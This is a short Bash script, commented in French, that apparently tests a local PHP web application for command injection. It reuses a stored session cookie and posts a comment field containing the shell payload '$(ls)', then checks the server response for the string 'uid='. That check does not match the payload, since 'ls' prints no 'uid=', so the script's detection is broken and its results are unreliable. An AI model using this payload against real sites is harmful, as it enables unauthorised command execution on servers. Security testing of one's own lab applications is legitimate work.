#!/bin/bash

# Lire les informations de session depuis un fichier
PHPSESSID=$(head -n 1 session_info.txt)

# Vérifier que PHPSESSID n'est pas vide
if [ -z "$PHPSESSID" ]; then
    echo "Session PHPSESSID manquante. Vérifiez votre fichier session_info.txt."
    exit 1
fi

# URL de la page pour soumettre un commentaire
COMMENT_URL="http://127.0.0.1/pages/user/annonce.php?annonce_id=1"

# Préparer la charge malveillante pour le champ de saisie
PAYLOAD='$(ls)'

# Effectuer une requête POST pour soumettre le commentaire avec la charge
response=$(curl -i -L -X POST "$COMMENT_URL" \
    -b "PHPSESSID=$PHPSESSID" \
    -d "content=$PAYLOAD" \
    -d "submit_cmt=Comment")


# Afficher la réponse complète pour voir le résultat du payload
echo "----------------------------------------"
echo "Réponse complète du serveur :"
echo "$response"
echo "----------------------------------------"


# Vérifier si le commentaire contenant l'injection apparaît dans la réponse
echo "----------------------------------------"
if echo "$response" | grep -q "uid="; then
    echo "Vulnérabilité détectée : la commande a été exécutée."
else
    echo "Aucune vulnérabilité détectée ou la commande n'a pas été exécutée."
fi
echo "----------------------------------------"

